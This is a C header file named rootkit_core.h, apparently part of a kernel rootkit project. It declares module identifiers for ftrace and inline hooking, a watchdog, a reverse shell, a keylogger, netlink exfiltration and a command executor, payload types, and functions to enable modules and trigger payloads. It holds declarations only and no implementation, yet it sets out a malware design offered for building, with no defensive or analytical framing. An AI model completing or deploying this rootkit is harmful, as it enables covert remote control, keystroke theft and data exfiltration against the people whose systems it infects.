#ifndef ROOTKIT_CORE_H
#define ROOTKIT_CORE_H

enum rk_module_id {
    MODULE_FTRACE,
    MODULE_INLINE_HOOK,
    MODULE_WATCHDOG,
    MODULE_REVERSE_SHELL,
    MODULE_KEYLOGGER,
    MODULE_NETLINK_EXFIL,
    MODULE_COMMAND_EXECUTOR,
    MODULE_SELF_WATCHDOG,
    MODULE_MAX
};

enum rk_payload_type {
    PAYLOAD_REVERSE_SHELL,
    PAYLOAD_KEYLOGGER_DUMP,
    PAYLOAD_TRIGGER_RECOVERY,
    PAYLOAD_CUSTOM
};

void enable_module(enum rk_module_id id);
void disable_module(enum rk_module_id id);
void trigger_payload(enum rk_payload_type type);
int is_module_enabled(enum rk_module_id id);
void rootkit_core_init(void);
void rootkit_core_exit(void);

#endif
